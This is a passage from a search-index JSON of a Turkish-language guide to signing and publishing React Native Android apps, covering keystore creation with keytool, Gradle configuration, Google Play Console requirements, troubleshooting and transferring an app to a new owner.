<li>Mutlaka aktif edin</li> <li>Upload key ile signing key ayr\u0131 olsun</li> <li>Keystore kayb\u0131 riskini minimize edin</li> </ol>"},{"location":"keystore/#13-eksik-kritik-konular","title":"13. Eksik Kritik Konular \u26a0\ufe0f","text":""},{"location":"keystore/#131-sha-256-fingerprint-firebasegoogle-services-icin","title":"13.1. SHA-256 Fingerprint (Firebase/Google Services \u0130\u00e7in)","text":"<p>Firebase, Google Sign-In, Google Maps kullan\u0131yorsan\u0131z mutlaka gerekli:</p> <pre><code># Release keystore'un SHA-256 fingerprint'ini al\u0131n\nkeytool -list -v -keystore android/app/my-upload-key.keystore -alias my-key-alias\n\n# \u00c7\u0131kt\u0131da \u015funu aray\u0131n:\n# SHA256: AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:...\n</code></pre> <p>Firebase Console'a Ekleme:</p> <ol> <li>Firebase Console \u2192 Project Settings \u2192 Your apps</li> <li>Android app se\u00e7in</li> <li>Add fingerprint \u2192 SHA-256'y\u0131 yap\u0131\u015ft\u0131r\u0131n</li> <li><code>google-services.json</code> dosyas\u0131n\u0131 yeniden indirin</li> <li><code>android/app/google-services.json</code> dosyas\u0131n\u0131 g\u00fcncelleyin</li> </ol> <p>[!IMPORTANT] Debug ve Release i\u00e7in ayr\u0131 fingerprint'ler:</p> <ul> <li>Debug: <code>~/.android/debug.keystore</code> (otomatik)</li> <li>Release: <code>my-upload-key.keystore</code> (sizin olu\u015fturdu\u011funuz)</li> </ul> <p>Her ikisini de Firebase'e eklemelisiniz!</p>"},{"location":"keystore/#132-64-bit-gereksinimi-2019dan-beri-zorunlu","title":"13.2. 64-bit Gereksinimi (2019'dan beri zorunlu)","text":"<p>Google Play, 64-bit deste\u011fi zorunlu k\u0131lm\u0131\u015ft\u0131r:</p> <p>android/app/build.gradle:</p> <pre><code>android {\n    defaultConfig {\n        ...\n        ndk {\n            abiFilters \"armeabi-v7a\", \"arm64-v8a\", \"x86\", \"x86_64\"\n        }\n    }\n\n    // Split APKs (\u00f6nerilen)\n    splits {\n        abi {\n            enable true\n            reset()\n            include \"armeabi-v7a\", \"arm64-v8a\"\n            universalApk false\n            enable gradle.startParameter.taskNames.any { it.contains(\"Release\") }\n        }\n    }\n}\n</code></pre> <p>Kontrol:</p> <pre><code># AAB i\u00e7eri\u011fini kontrol et\nunzip -l android/app/build/outputs/bundle/release/app-release.aab | grep \"lib/\"\n\n# \u015eunlar\u0131 g\u00f6rmeli:\n# lib/arm64-v8a/    \u2190 64-bit ARM (zorunlu!)\n# lib/armeabi-v7a/  \u2190 32-bit ARM\n</code></pre>"},{"location":"keystore/#133-internal-testing-track-ilk-upload-icin","title":"13.3. Internal Testing Track (\u0130lk Upload \u0130\u00e7in)","text":"<p>Production'a direkt y\u00fckleme yapmamal\u0131s\u0131n\u0131z!</p> <p>Do\u011fru S\u00fcre\u00e7:</p> <ol> <li>Internal Testing \u2192 Tak\u0131m i\u00e7i test (20 ki\u015fiye kadar)</li> <li>Closed Testing \u2192 Beta testerlar (s\u0131n\u0131rs\u0131z)</li> <li>Open Testing \u2192 Herkese a\u00e7\u0131k beta</li> <li>Production \u2192 Canl\u0131 yay\u0131n</li> </ol> <p>Internal Testing Kurulumu:</p> <pre><code>Play Console \u2192 Testing \u2192 Internal testing\n\u2192 Create new release\n\u2192 Upload AAB\n\u2192 Testers \u2192 Create email list\n\u2192 Add emails (max 100)\n\u2192 Save \u2192 Review release \u2192 Start rollout\n</code></pre> <p>Test Linki:</p> <pre><code>https://play.google.com/apps/internaltest/XXXXXXXX\n</code></pre>"},{"location":"keystore/#134-app-size-optimization","title":"13.4. App Size Optimization","text":"<p>AAB Boyutunu K\u00fc\u00e7\u00fcltme:</p> <pre><code>// android/app/build.gradle\nandroid {\n    buildTypes {\n        release {\n            // R8 full mode (daha agresif)\n            minifyEnabled true\n            shrinkResources true\n\n            // Proguard optimization\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n        }\n    }\n\n    // Unused resources'lar\u0131 kald\u0131r\n    packagingOptions {\n        exclude 'META-INF/*.kotlin_module'\n        exclude '**/kotlin/**'\n        exclude '**/*.txt'\n        exclude '**/*.version'\n        exclude '**/*.properties'\n    }\n}\n</code></pre> <p>Hermes Engine (React Native 0.70+):</p> <pre><code>// android/app/build.gradle\nproject.ext.react = [\n    enableHermes: true  // Varsay\u0131lan olarak true\n]\n</code></pre> <p>Boyut Analizi:</p> <pre><code># AAB boyutunu analiz et\nbundletool get-size total \\\n  --bundle=android/app/build/outputs/bundle/release/app-release.aab\n\n# APK boyutunu g\u00f6ster\nls -lh android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"keystore/#135-keystore-kayb-durumunda","title":"13.5. Keystore Kayb\u0131 Durumunda","text":"<p>E\u011fer keystore'u kaybettiyseniz:</p> <ol> <li>Google Play App Signing aktifse:</li> <li>\u2705 Upload key'i yenileyebilirsiniz</li> <li>Play Console \u2192 Setup \u2192 App signing \u2192 Request upload key reset</li> <li> <p>Google destek ekibi yard\u0131mc\u0131 olur</p> </li> <li> <p>Google Play App Signing aktif de\u011filse:</p> </li> <li>\u274c Uygulaman\u0131z\u0131 asla g\u00fcncelleyemezsiniz</li> <li>Yeni bir uygulama olarak yay\u0131nlaman\u0131z gerekir</li> <li>T\u00fcm kullan\u0131c\u0131lar\u0131, yorumlar\u0131, indirmeleri kaybedersiniz</li> </ol> <p>[!CAUTION] Bu y\u00fczden Google Play App Signing MUTLAKA aktif olmal\u0131!</p>"},{"location":"keystore/#136-store-listing-gereksinimleri","title":"13.6. Store Listing Gereksinimleri","text":"<p>Minimum Gereksinimler:</p> <ul> <li>App icon: 512x512px (PNG, 32-bit)</li> <li>Feature graphic: 1024x500px</li> <li>Screenshots: En az 2 adet</li> <li>Phone: 320-3840px (16:9 veya 9:16)</li> <li>7-inch tablet: 1024-7680px</li> <li>10-inch tablet: 1024-7680px</li> </ul> <p>Privacy Policy:</p> <ul> <li>E\u011fer hassas veri topluyorsan\u0131z zorunlu</li> <li>URL olarak sa\u011flanmal\u0131</li> <li>GDPR/KVKK uyumlu olmal\u0131</li> </ul> <p>Content Rating:</p> <ul> <li>IARC anketi doldurulmal\u0131</li> <li>Ya\u015f s\u0131n\u0131r\u0131 belirlenir</li> <li>T\u00fcm \u00fclkeler i\u00e7in ge\u00e7erli</li> </ul>"},{"location":"keystore/#137-data-safety-form-zorunlu","title":"13.7. Data Safety Form (ZORUNLU!)","text":"<p>[!CAUTION] Google Play Console'da \"Data Safety\" formu doldurulmadan release olu\u015fturamazs\u0131n\u0131z!</p> <p>Nas\u0131l Doldurulur:</p> <ol> <li>Play Console \u2192 App content \u2192 Data safety</li> <li>Start \u2192 Anketi doldurun</li> </ol> <p>Dikkat Edilmesi Gerekenler:</p> <ul> <li>Firebase Analytics: Evet, veri topluyoruz</li> <li>AdMob: Evet, reklam ID topluyoruz</li> <li>Crash reporting: Evet, crash logs topluyoruz</li> </ul>"},{"location":"keystore/#138-api-33-yeni-gereksinimler-android-13","title":"13.8. API 33+ Yeni Gereksinimler (Android 13+)","text":"<p>[!IMPORTANT] targetSdkVersion 33+ kullan\u0131yorsan\u0131z yeni zorunluluklar var!</p> <p>1. Notification Permission (ZORUNLU):</p> <pre><code>&lt;!-- android/app/src/main/AndroidManifest.xml --&gt;\n&lt;manifest&gt;\n    &lt;uses-permission android:name=\"android.permission.POST_NOTIFICATIONS\"/&gt;\n    ...\n&lt;/manifest&gt;\n</code></pre> <p>React Native'de runtime permission:</p> <pre><code>import { PermissionsAndroid, Platform } from \"react-native\";\n\nasync function requestNotificationPermission() {\n  if (Platform.OS === \"android\" &amp;&amp; Platform.Version &gt;= 33) {\n    const granted = await PermissionsAndroid.request(\n      PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS,\n    );\n    return granted === PermissionsAndroid.RESULTS.GRANTED;\n  }\n  return true;\n}\n</code></pre> <p>2. Foreground Service Types:</p> <pre><code>&lt;!-- E\u011fer foreground service kullan\u0131yorsan\u0131z --&gt;\n&lt;service\n    android:name=\".MyForegroundService\"\n    android:foregroundServiceType=\"location|camera|microphone\" /&gt;\n</code></pre> <p>[!WARNING] API 33+ i\u00e7in notification permission zorunlu. Eklemezsaniz bildirimler \u00e7al\u0131\u015fmaz!</p>"},{"location":"keystore/#14-ek-troubleshooting","title":"14. Ek Troubleshooting \ud83d\udd27","text":""},{"location":"keystore/#141-assetsgorseller-gorunmuyor","title":"14.1. Assets/G\u00f6rseller G\u00f6r\u00fcnm\u00fcyor","text":"<p>Sorun: Release APK'da g\u00f6rseller veya fontlar y\u00fcklenmiyor.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code># Manuel bundle olu\u015ftur\nnpx react-native bundle \\\n  --platform android \\\n  --dev false \\\n  --entry-file index.js \\\n  --bundle-output android/app/src/main/assets/index.android.bundle \\\n  --assets-dest android/app/src/main/res\n\n# Sonra build\ncd android &amp;&amp; ./gradlew assembleRelease\n</code></pre>"},{"location":"keystore/#142-install_failed_update_incompatible","title":"14.2. INSTALL_FAILED_UPDATE_INCOMPATIBLE","text":"<p>Sorun: Farkl\u0131 imza ile imzalanm\u0131\u015f eski uygulama y\u00fckl\u00fc.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code># Eski uygulamay\u0131 kald\u0131r\nadb uninstall com.yourapp\n\n# Yeni APK'y\u0131 y\u00fckle\nadb install android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"keystore/#143-execution-failed-for-task-appvalidatesigningrelease","title":"14.3. Execution failed for task ':app:validateSigningRelease'","text":"<p>Sorun: Keystore bulunam\u0131yor veya \u015fifre yanl\u0131\u015f.</p> <p>Kontrol:</p> <pre><code># Dosya var m\u0131?\nls -la android/app/my-upload-key.keystore\n\n# \u015eifre do\u011fru mu?\nkeytool -list -keystore android/app/my-upload-key.keystore\n\n# gradle.properties do\u011fru mu?\ncat ~/.gradle/gradle.properties\n</code></pre> <p>Yayg\u0131n Hata:</p> <pre><code># \u2705 DO\u011eRU\nMYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\n\n# \u274c YANLI\u015e\nMYAPP_UPLOAD_STORE_FILE=android/app/my-upload-key.keystore\n</code></pre>"},{"location":"keystore/#144-install_parse_failed_no_certificates","title":"14.4. INSTALL_PARSE_FAILED_NO_CERTIFICATES","text":"<p>Sorun: APK imzalanmam\u0131\u015f.</p> <p>\u00c7\u00f6z\u00fcm:</p> <pre><code>apksigner verify --verbose app-release.apk\n</code></pre>"},{"location":"keystore/#15-hzl-referans","title":"15. H\u0131zl\u0131 Referans \ud83d\ude80","text":"Komut A\u00e7\u0131klama <code>./gradlew bundleRelease</code> AAB olu\u015ftur <code>./gradlew assembleRelease</code> APK olu\u015ftur <code>./gradlew clean</code> Cache temizle <code>keytool -list -v -keystore x.keystore</code> Keystore bilgisi <code>apksigner verify app.apk</code> \u0130mza do\u011frula <code>adb install app.apk</code> Cihaza y\u00fckle <p>Dosya Yollar\u0131:</p> <ul> <li>AAB: <code>android/app/build/outputs/bundle/release/app-release.aab</code></li> <li>APK: <code>android/app/build/outputs/apk/release/app-release.apk</code></li> </ul>"},{"location":"keystore/#16-final-checklist","title":"16. Final Checklist \ud83d\udccb","text":"<p>Release \u00d6ncesi:</p> <ul> <li>[ ] Keystore 3 yerde yedeklendi</li> <li>[ ] <code>targetSdkVersion</code> g\u00fcncel (2024: API 34)</li> <li>[ ] 64-bit support (<code>arm64-v8a</code>)</li> <li>[ ] V3/V4 signing aktif (<code>enableV3Signing</code>, <code>enableV4Signing</code>)</li> <li>[ ] API 33+ notification permission eklendi (gerekirse)</li> <li>[ ] \u0130mza do\u011fruland\u0131</li> <li>[ ] Ger\u00e7ek cihazda test edildi</li> </ul> <p>Google Play:</p> <ul> <li>[ ] App Signing MUTLAKA aktif (2025'te zorunlu!)</li> <li>[ ] Data Safety formu dolduruldu</li> <li>[ ] Internal testing yap\u0131ld\u0131</li> <li>[ ] SHA-256 Firebase'e eklendi (gerekirse)</li> </ul>"},{"location":"keystore/#17-uygulama-satsdevir-sureci","title":"17. Uygulama Sat\u0131\u015f\u0131/Devir S\u00fcreci \ud83d\udd04","text":""},{"location":"keystore/#171-keystore-nasl-uretiliyor","title":"17.1. Keystore Nas\u0131l \u00dcretiliyor?","text":"<p>[!NOTE] Keystore \u00fcreten ara\u00e7: <code>keytool</code></p> <ul> <li>Java JDK ile birlikte gelir (built-in)</li> <li>Ba\u015fka alternatif ara\u00e7 yok, bu resmi y\u00f6ntem</li> <li>Android Studio'da GUI var ama komut sat\u0131r\u0131 daha g\u00fcvenilir</li> </ul> <p>keytool Nedir?</p> <ul> <li>Java Development Kit (JDK) i\u00e7inde gelen bir komut sat\u0131r\u0131 arac\u0131</li> <li>Dijital sertifika ve keystore y\u00f6netimi i\u00e7in kullan\u0131l\u0131r</li> <li>T\u00fcm platformlarda ayn\u0131 \u015fekilde \u00e7al\u0131\u015f\u0131r (Windows, macOS, Linux)</li> </ul> <p>Kurulum:</p> <pre><code># JDK kurulu mu kontrol et\njava -version\nkeytool -version\n\n# Kurulu de\u011filse:\n# macOS: brew install openjdk@17\n# Windows: Oracle JDK veya Adoptium\n# Linux: sudo apt install openjdk-17-jdk\n</code></pre> <p>Android Studio GUI (Alternatif):</p> <ol> <li>Build \u2192 Generate Signed Bundle/APK</li> <li>Create new keystore</li> <li>Bilgileri doldur</li> <li>Keystore olu\u015fturulur</li> </ol> <p>[!TIP] Komut sat\u0131r\u0131 y\u00f6ntemi daha g\u00fcvenilir ve otomasyon i\u00e7in uygun!</p>"},{"location":"keystore/#172-uygulama-satsdevir-sureci","title":"17.2. Uygulama Sat\u0131\u015f\u0131/Devir S\u00fcreci","text":"<p>Senaryo: \"Expense Tracker\" uygulaman\u0131z\u0131 ba\u015fka bir geli\u015ftiriciye sat\u0131yorsunuz.</p>"},{"location":"keystore/#adm-1-keystore-transferi","title":"Ad\u0131m 1: Keystore Transferi","text":"<p>Verilmesi Gerekenler:</p> <pre><code># 1. Keystore dosyas\u0131\nexpense-tracker-upload-key.keystore\n\n# 2. Keystore bilgileri (g\u00fcvenli \u015fekilde payla\u015f)\nKeystore Password: ********\nKey Alias: expense-tracker-key\nKey Password: ********\n</code></pre> <p>G\u00fcvenli Transfer Y\u00f6ntemleri:</p> <pre><code># Se\u00e7enek 1: \u015eifreli ZIP\nzip -e keystore-package.zip expense-tracker-upload-key.keystore keystore-info.txt\n# \u015eifreyi ayr\u0131 kanaldan payla\u015f (SMS, telefon)\n\n# Se\u00e7enek 2: Password Manager\n# 1Password, Bitwarden gibi ara\u00e7larla g\u00fcvenli payla\u015f\u0131m\n\n# Se\u00e7enek 3: \u015eifreli Cloud Storage\n# Google Drive (\u015fifreli), Dropbox (\u015fifreli)\n</code></pre> <p>[!CAUTION] Asla email ile \u015fifresiz g\u00f6ndermeyin!</p>"},{"location":"keystore/#adm-2-google-play-console-transfer","title":"Ad\u0131m 2: Google Play Console Transfer","text":"<p>Play Console'da Transfer:</p> <ol> <li>Play Console \u2192 Settings \u2192 Developer account</li> <li>Transfer apps se\u00e7ene\u011fini bul</li> <li>Al\u0131c\u0131n\u0131n email adresini ekle</li> <li>Transfer iste\u011fi g\u00f6nder</li> <li>Al\u0131c\u0131 kabul eder</li> </ol> <p>Alternatif: Developer Account De\u011fi\u015fikli\u011fi</p> <p>E\u011fer tam devir yap\u0131lacaksa:</p> <ol> <li>Play Console \u2192 Users and permissions</li> <li>Yeni sahibi Admin olarak ekle</li> <li>Kendini kald\u0131r (veya yetkilerini d\u00fc\u015f\u00fcr)</li> </ol>"},{"location":"keystore/#adm-3-devir-sonras-kontrol-listesi","title":"Ad\u0131m 3: Devir Sonras\u0131 Kontrol Listesi","text":"<p>Al\u0131c\u0131n\u0131n Yapmas\u0131 Gerekenler:</p> <ul> <li>[ ] Keystore dosyas\u0131n\u0131 g\u00fcvenli yere kaydet</li> <li>[ ] \u015eifreleri password manager'a ekle</li> <li>[ ] Test build al (imza do\u011frula)</li> <li>[ ] Google Play Console eri\u015fimini kontrol et</li> <li>[ ] Firebase/Analytics hesaplar\u0131n\u0131 devral (gerekirse)</li> <li>[ ] App Store listing'i g\u00fcncelle (gerekirse)</li> </ul> <p>Sat\u0131c\u0131n\u0131n Yapmas\u0131 Gerekenler:</p> <ul> <li>[ ] Keystore'u yedekten sil (art\u0131k senin de\u011fil!)</li> <li>[ ] \u015eifreleri password manager'dan kald\u0131r</li> <li>[ ] Play Console eri\u015fimini kald\u0131r</li> <li>[ ] Firebase/Analytics eri\u015fimini kald\u0131r</li> <li>[ ] Kaynak kodunu devret (anla\u015fmaya g\u00f6re)</li> </ul>"},{"location":"keystore/#173-keystore-guvenligi-sats-oncesi","title":"17.3. Keystore G\u00fcvenli\u011fi (Sat\u0131\u015f \u00d6ncesi)","text":"<p>Sat\u0131\u015f \u00d6ncesi Haz\u0131rl\u0131k:</p> <pre><code># 1. Keystore bilgilerini dok\u00fcmante et\ncat &gt; transfer-package/README.txt &lt;&lt; EOF\nApp Name: Expense Tracker\nPackage: com.yourcompany.expensetracker\nKeystore File: expense-tracker-upload-key.keystore\nAlias: expense-tracker-key\nCreated: 2024-01-15\nLast Used: 2024-12-20\n\nIMPORTANT:\n- This keystore is CRITICAL for app updates\n- Store passwords in a password manager\n- Keep 3 backups in different locations\n- Never commit to Git\nEOF\n\n# 2. Keystore'u test et\nkeytool -list -v -keystore expense-tracker-upload-key.keystore\n\n# 3. Son bir release build al (do\u011frulama i\u00e7in)\ncd android &amp;&amp; ./gradlew bundleRelease\n</code></pre> <p>Transfer Paketi:</p> <pre><code>transfer-package/\n\u251c\u2500\u2500 expense-tracker-upload-key.keystore\n\u251c\u2500\u2500 keystore-info.txt (\u015fifreler)\n\u251c\u2500\u2500 README.txt (talimatlar)\n\u251c\u2500\u2500 last-release.aab (son build)\n\u2514\u2500\u2500 SHA-256-fingerprint.txt (Firebase i\u00e7in)\n</code></pre>"},{"location":"keystore/#174-yasal-hususlar","title":"17.4. Yasal Hususlar","text":"<p>[!WARNING] Sat\u0131\u015f S\u00f6zle\u015fmesinde Bulunmas\u0131 Gerekenler:</p> <ul> <li>Keystore'un m\u00fclkiyeti al\u0131c\u0131ya ge\u00e7er</li> <li>Sat\u0131c\u0131 keystore'u silmeyi taahh\u00fct eder</li> <li>Uygulama g\u00fcncellemelerini sadece al\u0131c\u0131 yapabilir</li> <li>Google Play Console eri\u015fimi devredilir</li> <li>Kaynak kodu devri (varsa)</li> </ul> <p>\u00d6rnek Madde:</p> <pre><code>\"Sat\u0131c\u0131, [App Name] uygulamas\u0131n\u0131n Android keystore dosyas\u0131n\u0131,\nilgili \u015fifreleri ve Google Play Console eri\u015fimini al\u0131c\u0131ya\ndevretmeyi kabul eder. Sat\u0131c\u0131, devir sonras\u0131 keystore'u\nsilmeyi ve uygulamay\u0131 g\u00fcncellememyi taahh\u00fct eder.\"\n</code></pre>"},{"location":"keystore/#18-kaynaklar","title":"18. Kaynaklar \ud83d\udcda","text":"<ul> <li>Android Developer - App Signing</li> <li>React Native - Publishing to Google Play</li> <li>Google Play Console</li> <li>bundletool</li> </ul> <p>\ud83d\udca1 Pro Tip: Keystore'unuzu kaybetmek, uygulaman\u0131z\u0131 kaybetmek demektir. Mutlaka yedekleyin!</p>"},{"location":"android/","title":"Android Publishing Guide","text":"<p>[!NOTE] Bu b\u00f6l\u00fcm, React Native Android uygulamalar\u0131n\u0131 Google Play Store ve alternatif platformlara yay\u0131nlama s\u00fcrecini kapsar.</p>"},{"location":"android/#icindekiler","title":"\ud83d\udcda \u0130\u00e7indekiler","text":""},{"location":"android/#1-keystore-temelleri","title":"1. Keystore Temelleri","text":"<ul> <li>Keystore nedir?</li> <li>Tek vs \u00c7oklu keystore stratejisi</li> <li>Keystore olu\u015fturma</li> <li>G\u00fcvenli saklama</li> </ul>"},{"location":"android/#2-gradle-konfigurasyonu","title":"2. Gradle Konfig\u00fcrasyonu","text":"<ul> <li>Signing configs</li> <li>ProGuard/R8 rules</li> <li>Hibrit yakla\u015f\u0131m (Env Vars + gradle.properties)</li> </ul>"},{"location":"android/#3-build-ve-release","title":"3. Build ve Release","text":"<ul> <li>AAB vs APK</li> <li>Release build alma</li> <li>Alternatif da\u011f\u0131t\u0131m kanallar\u0131 (F-Droid, GitHub Releases)</li> <li>Da\u011f\u0131t\u0131m stratejisi</li> </ul>"},{"location":"android/#4-google-play-console","title":"4. Google Play Console","text":"<ul> <li>App Signing by Google Play</li> <li>Upload Key vs Signing Key</li> <li>Version y\u00f6netimi</li> <li>Store listing gereksinimleri</li> <li>Data Safety formu</li> </ul>"},{"location":"android/#5-troubleshooting","title":"5. Troubleshooting","text":"<ul> <li>Yayg\u0131n hatalar ve \u00e7\u00f6z\u00fcmler</li> <li>\u0130mza do\u011frulama</li> <li>Assets/g\u00f6rseller sorunu</li> <li>H\u0131zl\u0131 referans</li> </ul>"},{"location":"android/#6-uygulama-satsdevir","title":"6. Uygulama Sat\u0131\u015f\u0131/Devir","text":"<ul> <li>Keystore transferi</li> <li>Google Play Console transfer</li> <li>Yasal hususlar</li> <li>Devir sonras\u0131 checklist</li> </ul>"},{"location":"android/#7-fastlane-otomasyonu","title":"7. Fastlane Otomasyonu","text":"<ul> <li>Kurulum ve Service Account</li> <li><code>Fastfile</code> konfig\u00fcrasyonu</li> <li>Tek komutla deploy (<code>fastlane internal</code>)</li> </ul>"},{"location":"android/#8-cicd-pipelinelar","title":"8. CI/CD Pipeline'lar\u0131","text":"<ul> <li>GitHub Actions workflow</li> <li>GitLab CI/CD</li> <li>Secrets y\u00f6netimi</li> </ul>"},{"location":"android/#9-release-sonras-monitoring","title":"9. Release Sonras\u0131 Monitoring","text":"<ul> <li>Firebase Crashlytics &amp; Mapping Files</li> <li>Google Play Vitals (ANR &amp; Crash rate)</li> <li>Performans izleme</li> </ul>"},{"location":"android/#10-ileri-seviye-pratikler","title":"10. \u0130leri Seviye Pratikler \ud83d\ude80","text":"<ul> <li>CodePush: Store onay\u0131 beklemeden hot-update</li> <li>Firebase App Distribution: H\u0131zl\u0131 QA da\u011f\u0131t\u0131m\u0131</li> <li>Auto Badging: \u0130konlara versiyon numaras\u0131 basma</li> </ul>"},{"location":"android/#hzl-baslangc","title":"\ud83d\ude80 H\u0131zl\u0131 Ba\u015flang\u0131\u00e7","text":"<p>\u0130lk kez yay\u0131nl\u0131yorsan\u0131z:</p> <ol> <li>Keystore olu\u015fturun</li> <li>Gradle'\u0131 yap\u0131land\u0131r\u0131n</li> <li>Release build al\u0131n</li> <li>Google Play'e y\u00fckleyin</li> </ol> <p>Sorun mu ya\u015f\u0131yorsunuz?</p> <ul> <li>Troubleshooting b\u00f6l\u00fcm\u00fcne bak\u0131n</li> <li>H\u0131zl\u0131 Referans kart\u0131n\u0131 kullan\u0131n</li> </ul> <p>\ud83d\udca1 Pro Tip: Her uygulama i\u00e7in ayr\u0131 keystore kullan\u0131n!</p>"},{"location":"android/01-keystore-basics/","title":"Keystore Temelleri","text":""},{"location":"android/01-keystore-basics/#android-keystore-ve-apk-imzalama-rehberi","title":"Android Keystore ve APK \u0130mzalama Rehberi","text":"<p>[!WARNING] Gizli D\u00f6k\u00fcman: Bu sayfa navigasyonda g\u00f6r\u00fcnmez. Sadece do\u011frudan URL ile eri\u015filebilir.</p> <p>G\u00fcvenlik Uyar\u0131s\u0131: Keystore dosyas\u0131 ve \u015fifreleri asla Git'e commit etmeyin!</p> <p>React Native Android uygulaman\u0131z\u0131 Google Play Store'a y\u00fcklemek i\u00e7in APK/AAB dosyas\u0131n\u0131 imzalaman\u0131z gerekir. Bu rehber t\u00fcm s\u00fcreci ad\u0131m ad\u0131m anlat\u0131r.</p>"},{"location":"android/01-keystore-basics/#keystore-nedir","title":"Keystore Nedir? \ud83d\udd11","text":"<p>Keystore, Android uygulaman\u0131z\u0131 imzalamak i\u00e7in kullan\u0131lan dijital sertifika deposudur.</p> <p>\u00d6nemli Noktalar:</p> <ul> <li>Her uygulama benzersiz bir keystore ile imzalanmal\u0131d\u0131r</li> <li>Keystore kaybedilirse, uygulaman\u0131z\u0131 asla g\u00fcncelleyemezsiniz</li> <li>Google Play, ayn\u0131 keystore ile imzalanm\u0131\u015f APK'lar\u0131 ayn\u0131 uygulama olarak tan\u0131r</li> <li>Keystore \u015fifresini unutmay\u0131n - kurtarma yolu yoktur!</li> </ul>"},{"location":"android/01-keystore-basics/#tek-keystore-vs-coklu-keystore-cok-onemli","title":"Tek Keystore vs \u00c7oklu Keystore (\u00c7ok \u00d6nemli!) \ud83c\udfaf","text":"<p>[!CAUTION] Birden fazla uygulama geli\u015ftiriyorsan\u0131z:</p> <p>\u274c YANLI\u015e: T\u00fcm uygulamalar i\u00e7in ayn\u0131 keystore \u2705 DO\u011eRU: Her uygulama i\u00e7in ayr\u0131 keystore</p> <p>Neden Her Uygulama \u0130\u00e7in Ayr\u0131 Keystore?</p> Senaryo Tek Keystore \u00c7oklu Keystore G\u00fcvenlik \u274c Bir keystore s\u0131zarsa t\u00fcm uygulamalar risk alt\u0131nda \u2705 Sadece 1 uygulama etkilenir Uygulama Sat\u0131\u015f\u0131 \u274c Keystore'u payla\u015fmak zorunda kal\u0131rs\u0131n \u2705 Sadece o uygulaman\u0131n keystore'unu verirsin Organizasyon \u274c Hangi keystore hangi app'e ait belli de\u011fil \u2705 Her keystore a\u00e7\u0131k\u00e7a etiketli Keystore Kayb\u0131 \u274c T\u00fcm uygulamalar g\u00fcncelleme alamaz \u2705 Sadece 1 uygulama etkilenir <p>\u00d6nerilen \u0130simlendirme:</p> <pre><code># \u274c YANLI\u015e (genel isim)\nmy-upload-key.keystore\n\n# \u2705 DO\u011eRU (uygulama \u00f6zel)\nexpense-tracker-upload-key.keystore\ntodo-app-upload-key.keystore\nfitness-app-upload-key.keystore\n</code></pre> <p>Dosya Yap\u0131s\u0131 \u00d6rne\u011fi:</p> <pre><code>~/keystores/\n\u251c\u2500\u2500 expense-tracker/\n\u2502   \u251c\u2500\u2500 expense-tracker-upload-key.keystore\n\u2502   \u2514\u2500\u2500 keystore-info.txt  (\u015fifreler, alias)\n\u251c\u2500\u2500 todo-app/\n\u2502   \u251c\u2500\u2500 todo-app-upload-key.keystore\n\u2502   \u2514\u2500\u2500 keystore-info.txt\n\u2514\u2500\u2500 fitness-app/\n    \u251c\u2500\u2500 fitness-app-upload-key.keystore\n    \u2514\u2500\u2500 keystore-info.txt\n</code></pre> <p>[!TIP] Best Practice:</p> <ul> <li>Her uygulama i\u00e7in ayr\u0131 klas\u00f6r</li> <li>Keystore ad\u0131nda uygulama ad\u0131 olsun</li> <li>\u015eifreleri <code>keystore-info.txt</code> dosyas\u0131nda sakla (\u015fifreli cloud'da)</li> </ul>"},{"location":"android/01-keystore-basics/#keystore-olusturma","title":"Keystore Olu\u015fturma \ud83d\udee0\ufe0f","text":""},{"location":"android/01-keystore-basics/#gereksinimler","title":"Gereksinimler","text":"<pre><code># Java JDK kurulu olmal\u0131 (React Native s\u00fcr\u00fcm\u00fcn\u00fcze uygun)\njava -version\n\n# keytool komutu JDK ile gelir, yard\u0131m\u0131 g\u00f6rerek kontrol edebilirsiniz\nkeytool -help\n</code></pre> <p>[!IMPORTANT] JDK S\u00fcr\u00fcm Uyumlulu\u011fu:</p> <ul> <li>React Native 0.73+: JDK 17 (\u00f6nerilen)</li> <li>React Native 0.68-0.72: JDK 11 veya 17</li> <li>Eski versiyonlar: JDK 8 veya 11</li> </ul> <p>Yanl\u0131\u015f JDK s\u00fcr\u00fcm\u00fc build hatalar\u0131na neden olur!</p>"},{"location":"android/01-keystore-basics/#keystore-olusturma-komutu","title":"Keystore Olu\u015fturma Komutu","text":"<pre><code># Proje root dizininde\ncd android/app\n\n# Keystore olu\u015ftur (\u00d6NER\u0130LEN)\nkeytool -genkeypair -v \\\n  -storetype PKCS12 \\\n  -keystore my-upload-key.keystore \\\n  -alias my-key-alias \\\n  -keyalg RSA \\\n  -keysize 2048 \\\n  -validity 10000 \\\n  -sigalg SHA256withRSA\n</code></pre> <p>Parametreler:</p> <ul> <li><code>-storetype PKCS12</code>: Modern keystore format\u0131 (\u00f6nerilen)</li> <li><code>-keystore my-upload-key.keystore</code>: Keystore dosya ad\u0131</li> <li><code>-alias my-key-alias</code>: Key alias (hat\u0131rlay\u0131n!)</li> <li><code>-keyalg RSA</code>: Algoritma</li> <li><code>-keysize 2048</code>: Key boyutu</li> <li><code>-validity 10000</code>: Ge\u00e7erlilik s\u00fcresi (g\u00fcn) - Minimum 25 y\u0131l gerekli!</li> <li><code>-sigalg SHA256withRSA</code>: \u0130mza algoritmas\u0131 (uyumluluk i\u00e7in)</li> </ul> <p>[!CAUTION] validity Parametresi Kritik: Google Play, sertifikan\u0131n en az 22 Ekim 2033 tarihine kadar ge\u00e7erli olmas\u0131n\u0131 \u015fart ko\u015far. 10000 g\u00fcnden (27 y\u0131l) az verilirse ileride g\u00fcncelleme sorunu ya\u015fanabilir!</p>"},{"location":"android/01-keystore-basics/#istenecek-bilgiler","title":"\u0130stenecek Bilgiler","text":"<pre><code>Enter keystore password: ********\nRe-enter new password: ********\n\nWhat is your first and last name?\n  [Unknown]:  John Doe\n\nWhat is the name of your organizational unit?\n  [Unknown]:  Development\n\nWhat is the name of your organization?\n  [Unknown]:  MyCompany\n\nWhat is the name of your City or Locality?\n  [Unknown]:  Istanbul\n\nWhat is the name of your State or Province?\n  [Unknown]:  Istanbul\n\nWhat is the two-letter country code for this unit?\n  [Unknown]:  TR\n\nIs CN=John Doe, OU=Development, O=MyCompany, L=Istanbul, ST=Istanbul, C=TR 